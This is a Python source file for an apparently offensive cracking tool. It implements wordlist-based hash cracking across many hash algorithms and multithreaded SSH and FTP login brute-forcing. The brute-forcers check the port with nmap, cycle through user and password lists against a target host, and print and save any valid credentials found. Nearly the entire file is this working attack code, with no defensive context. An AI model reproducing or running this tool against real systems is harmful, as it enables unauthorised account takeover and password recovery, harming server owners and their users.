#!/usr/bin/env python3
# coding: utf-8
# hashlib.algorithms_available: {'sha3_256', 'sha512_224', 'blake2b', 'whirlpool', 'sha3_224', 'md5', 'sha384', 'md4', 'sha3_512', 'sha512', 'sha3_384', 'shake_128', 'sm3', 'sha1', 'md5-sha1', 'sha512_256', 'blake2s', 'sha224', 'ripemd160', 'sha256', 'shake_256'}

# ------------------------------------------ LIBRARIES ------------------------------------------- #
import time
import lib.manual
import glob
import nmap
import os
import hashlib, ftplib
import colorama
import itertools
import threading
from collections import namedtuple
from pexpect import pxssh
from colorama import Fore, Style
from threading import Thread

# --------------------------------------- GLOBAL VARIABLES --------------------------------------- #
__algorithms__ = ['md5', 'md4', 'sha1', 'sha224', 'sha256', 'sha384', 'sha512', 'sha3_224', 'sha3_256', 'sha3_384', 'sha3_512', 'shake_128', 'shake_256', 'blake2b', 'blake2s']
__crackcmd__ = ['wordlist', 'wordlist2', 'ipv4']

rst = f"{Fore.WHITE}{Style.NORMAL}"
bred = f"{Fore.RED}{Style.BRIGHT}"
grn = f"{Fore.GREEN}{Style.NORMAL}"
bgrn = f"{Fore.GREEN}{Style.BRIGHT}"
blue = f"{Fore.BLUE}{Style.BRIGHT}"

found = False
fail = 0
max_connections = 30
connection = threading.BoundedSemaphore(max_connections)

# --------------------------------------- Global Function --------------------------------------- #
def nmapScan(ip, port):
    nmapScan = nmap.PortScanner()
    nmapScan.scan(ip, port)
    state = nmapScan[ip]['tcp'][int(port)]['state']
    return state

def sshconnect(host, user, password, release):
    global found
    global fail
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print(f"{bgrn}[+] {rst}Valid credentials found.\t[USER]:{bgrn}{user}\t{rst}[PASS]:{bgrn}{password}{rst}")
        found = True
        s.logout()
    except Exception as e:
        if 'read_nonblocking' in str(e):
            fail += 1
            time.sleep(5)
            sshconnect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            sshconnect(host, user, password, False)
    finally:
        if release: 
            connection.release()

def ftpconnect(host, user, password, release):
    global found
    f = ftplib.FTP()
    port = 21

    try:
        f.connect(host, port, timeout=5)
        f.login(user, password)
        found = True
        f.quit()
    except ftplib.error_perm:
        return
    else:
        # correct credentials
        print(f"{bgrn}[+] {rst}Valid credentials found.\t[USER]:{bgrn}{user}\t{rst}[PASS]:{bgrn}{password}{rst}")
    finally:
        if release:
            connection.release()

# --------------------------------------------- CRACK -------------------------------------------- #
class Crack:

    def hlcrack(self, userHash, hashmode, wordlist):
        start = time.time()
        cr4cked = False
        self.lineCount = 0
        if hashmode.lower() == __algorithms__[0]:
            hl = hashlib.md5
        elif hashmode.lower() == __algorithms__[1]:
            hl = hashlib
        elif hashmode.lower() == __algorithms__[2]:
            hl = hashlib.sha1
        elif hashmode.lower() == __algorithms__[3]:
            hl = hashlib.sha224
        elif hashmode.lower() == __algorithms__[4]:
            hl = hashlib.sha256
        elif hashmode.lower() == __algorithms__[5]:
            hl = hashlib.sha384
        elif hashmode.lower() == __algorithms__[6]:
            hl = hashlib.sha512
        elif hashmode.lower() == __algorithms__[7]:
            hl = hashlib.sha3_224
        elif hashmode.lower() == __algorithms__[8]:
            hl = hashlib.sha3_256
        elif hashmode.lower() == __algorithms__[9]:
            hl = hashlib.sha3_384
        elif hashmode.lower() == __algorithms__[10]:
            hl = hashlib.sha3_512
        elif hashmode.lower() == __algorithms__[11]:
            hl = hashlib.shake_128
        elif hashmode.lower() == __algorithms__[12]:
            hl = hashlib.shake_256
        elif hashmode.lower() == __algorithms__[13]:
            hl = hashlib.blake2b
        elif hashmode.lower() == __algorithms__[14]:
            hl = hashlib.blake2s
        else:
            hl = hashlib

        if not os.path.isfile(userHash):
            with open(wordlist, "r", encoding='latin-1') as infile:
                for line in infile:
                    line = line.strip()
                    encodeline = line.encode()
                    if hl != hashlib:
                        lineHash = hl(encodeline).hexdigest()
                    else:
                        lineHash = hl.new(hashmode.lower().strip(), encodeline).hexdigest()

                    if str(lineHash) == str(userHash.lower()):
                        end = time.time()
                        print(f"{bgrn}[+] {rst}Plaintext   : {bgrn}{line}{rst}")
                        print(f"{blue}[*] {rst}Words tried : {self.lineCount}")
                        print(f"{blue}[*] {rst}Process time: {round((end - start), 2)} seconds")
                        savedHashFile = open('ocr4cked.txt', 'a+')
                        for cr4ckedHash in savedHashFile:
                            if lineHash in cr4ckedHash.split(":")[1].strip():
                                cr4cked = True
                        if cr4cked is False:
                            print(f"{blue}[*] {rst}Result saved to ocr4cked.txt\n")
                            savedHashFile.write(f'{lineHash}:{line}:{hashmode}')
                            savedHashFile.write('\n')
                        savedHashFile.close()
                        return None
                    else:
                        self.lineCount = self.lineCount + 1
        else:
            try:
                userHashes = open(userHash, 'r', encoding='latin-1')
                infile = open(wordlist, 'r', encoding='latin-1')
            except Exception as e:
                print(e)

            for uhash, line in itertools.product(userHashes, infile):
                uhash = uhash.strip()
                line = line.strip()
                encodeline = line.encode()
                if hl != hashlib:
                    lineHash = hl(encodeline).hexdigest()
                else:
                    lineHash = hl.new(hashmode.lower().strip(), encodeline).hexdigest()
                
                if str(lineHash) == str(uhash.lower()):
                    end = time.time()
                    print(f"{bgrn}[+] {rst}Current hash: {uhash}")
                    print(f"{bgrn}[+] {rst}Plaintext   : {bgrn}{line}{rst}")
                    print(f"{blue}[*] {rst}Words tried : {self.lineCount}")
                    print(f"{blue}[*] {rst}Process time: {round((end - start), 2)} seconds")
                    savedHashFile = open('ocr4cked.txt', 'a+')
                    for cr4ckedHash in savedHashFile:
                        if lineHash in cr4ckedHash.split(":")[1].strip():
                            cr4cked = True

                    if cr4cked is False:
                        print(f"{blue}[*] {rst}Result saved to ocr4cked.txt\n")
                        savedHashFile.write(f'{lineHash}:{line}:{hashmode}')
                        savedHashFile.write('\n')
                        
                    savedHashFile.close()
                    
                else:
                    self.lineCount += 1

        end = time.time()
        print(f"{blue}[*] {rst}End of wordlist: {wordlist}")
        print(f"{blue}[*] {rst}Words tried: {self.lineCount}")
        print(f"{blue}[*] {rst}Time: {round((end - start), 2)} seconds")
        print(f"{blue}[*] {rst}Process ended.\n")

    def sshcrack(self, host, user, password):
        global found
        global fail
        print(f"\n{blue}[*] {rst}Checking SSH port state on: {host}")
        if nmapScan(host, '22') == 'open':
            print(f"{bgrn}[+] {rst}SSH status on {host}: {bgrn}active (running)")
            print(f"{bgrn}[+] {rst}Connection successful.")
        else:
            print(f"{bred}[-] {rst}SSH connection refused on {host}")
            print(f"{bred}[-] {rst}Connection failed.\n")
            return

        if not os.path.exists(user) and not os.path.exists(password):
            print(f"{bgrn}[+] {rst}Loading username: {user}")
            print(f"{bgrn}[+] {rst}Loading password: {password}")
            print(f"{blue}[*] {rst}Testing combination (u:p): {user}:{password}.")
            try:
                sshconnect(host, user, password, False)
            except Exception as e:
                print(e)
        
        elif not os.path.exists(user) and os.path.exists(password):
            print(f"{bgrn}[+] {rst}Loading username: {user}")
            print(f"{bgrn}[+] {rst}Loading passlist: {password}")
            try:
                passlist = open(password, 'r', encoding='latin-1')
            except Exception as e:
                print(e)

            for line in passlist:
                if found:
                    return
                elif fail > 5:
                    print(f"{bred}[-] {rst}Too many socket timeouts. Aborting...\n")
                    return

                connection.acquire()

                password = line.strip()
                print(f"{blue}[*] {rst}Testing combination (u:p): {user}:{password}")
                try:
                    t = Thread(target=sshconnect, args=(host, user, password, True))
                    t.deamon = True
                    t.start()
                    if found == False:
                        pass
                    else:
                        # initialize the connection and break the previous loop.
                        found = False
                        break
                except Exception as e:
                    print(e)

        elif os.path.exists(user) and not os.path.exists(password):
            print(f"{bgrn}[+] {rst}Loading userlist: {user}")
            print(f"{bgrn}[+] {rst}Loading password: {password}")
            try:
                userlist = open(user, 'r', encoding='latin-1')
            except Exception as e:
                print(e)

            for line in userlist:
                if found:
                    return
                elif fail > 5:
                    print(f"{bred}[-] {rst}Too many socket timeouts. Aborting...\n")
                    return

                connection.acquire()

                user = line.strip()
                print(f"{blue}[*] {rst}Testing combination (u:p): {user}:{password}")
                try:
                    t = Thread(target=sshconnect, args=(host, user, password, True))
                    t.start()
                    if found == False:
                        pass
                    else:
                        # initialize the connection and break the previous loop.
                        found = False
                        break
                except Exception as e:
                    print(e)
                    
        else:
            print(f"{bgrn}[+] {rst}Loading userlist: {user}")
            print(f"{bgrn}[+] {rst}Loading passlist: {password}")
            try:
                userlist = open(user, 'r', encoding='latin-1')
                passlist = open(password, 'r', encoding='latin-1')
            except Exception as e:
                print(e)

            for uline, pline in itertools.product(userlist, passlist):
                if found:
                    return
                elif fail > 5:
                    print(f"{bred}[-] {rst}Too many socket timeouts. Aborting...\n")
                    return

                connection.acquire()
                user = uline.strip()
                password = pline.strip()
                print(f"{blue}[*] {rst}Testing combination (u:p): {user}:{password}")
                try:
                    t = Thread(target=sshconnect, args=(host, user, password, True))
                    t.start()
                    if found == False:
                        pass
                    else:
                        # initialize the connection and break the previous loop.
                        found = False
                        break
                except Exception as e:
                    print(e)
        print(f"{blue}[*] {rst}Process ended.\n")

    def ftpcrack(self, host, user, password):
        global found
        global fail
        print(f"\n{blue}[*] {rst}Checking FTP port state on: {host}")
        if nmapScan(host, '21') == 'open':
            print(f"{bgrn}[+] {rst}FTP status on {host}: {bgrn}active (running)")
            print(f"{bgrn}[+] {rst}Connection successful.")
        else:
            print(f"{bred}[-] {rst}FTP connection refused on {host}")
            print(f"{bred}[-] {rst}Connection failed.\n")
            return

        if not os.path.exists(user) and not os.path.exists(password):
            print(f"{bgrn}[+] {rst}Loading username: {user}")
            print(f"{bgrn}[+] {rst}Loading password: {password}")
            print(f"{blue}[*] {rst}Testing combination (u:p): {user}:{password}.")
            try:
                ftpconnect(host, user, password, False)
            except Exception as e:
                print(e)
        
        elif not os.path.exists(user) and os.path.exists(password):
            print(f"{bgrn}[+] {rst}Loading username: {user}")
            print(f"{bgrn}[+] {rst}Loading passlist: {password}")
            try:
                passlist = open(password, 'r', encoding='latin-1')
            except Exception as e:
                print(e)

            for line in passlist:
                if found:
                    return
                elif fail > 5:
                    print(f"{bred}[-] {rst}Too many socket timeouts. Aborting...\n")
                    return

                connection.acquire()

                password = line.strip()
                print(f"{blue}[*] {rst}Testing combination (u:p): {user}:{password}")
                try:
                    t = Thread(target=ftpconnect, args=(host, user, password, True))
                    t.start()
                    if found == False:
                        pass
                    else:
                        # initialize the connection and break the previous loop.
                        found = False
                        break
                except Exception as e:
                    print(e)

        elif os.path.exists(user) and not os.path.exists(password):
            print(f"{bgrn}[+] {rst}Loading userlist: {user}")
            print(f"{bgrn}[+] {rst}Loading password: {password}")
            try:
                userlist = open(user, 'r', encoding='latin-1')
            except Exception as e:
                print(e)

            for line in userlist:
                if found:
                    return
                elif fail > 5:
                    print(f"{bred}[-] {rst}Too many socket timeouts. Aborting...\n")
                    return

                connection.acquire()

                user = line.strip()
                print(f"{blue}[*] {rst}Testing combination (u:p): {user}:{password}")
                try:
                    t = Thread(target=ftpconnect, args=(host, user, password, True))
                    t.start()
                    if found == False:
                        pass
                    else:
                        # initialize the connection and break the previous loop.
                        found = False
                        break
                except Exception as e:
                    print(e)
        else:
            print(f"{bgrn}[+] {rst}Loading userlist: {user}")
            print(f"{bgrn}[+] {rst}Loading passlist: {password}")
            try:
                userlist = open(user, 'r', encoding='latin-1')
                passlist = open(password, 'r', encoding='latin-1')
            except Exception as e:
                print(e)

            for uline, pline in itertools.product(userlist, passlist):
                if found:
                    return
                elif fail > 5:
                    print(f"{bred}[-] {rst}Too many socket timeouts. Aborting...\n")
                    return

                connection.acquire()
                user = uline.strip()
                password = pline.strip()
                print(f"{blue}[*] {rst}Testing combination (u:p): {user}:{password}")
                try:
                    t = Thread(target=ftpconnect, args=(host, user, password, True))
                    t.start()
                    if found == False:
                        pass
                    else:
                        # initialize the connection and break the previous loop.
                        found = False
                        break
                except Exception as e:
                    print(e)
        print(f"{blue}[*] {rst}Process ended.\n")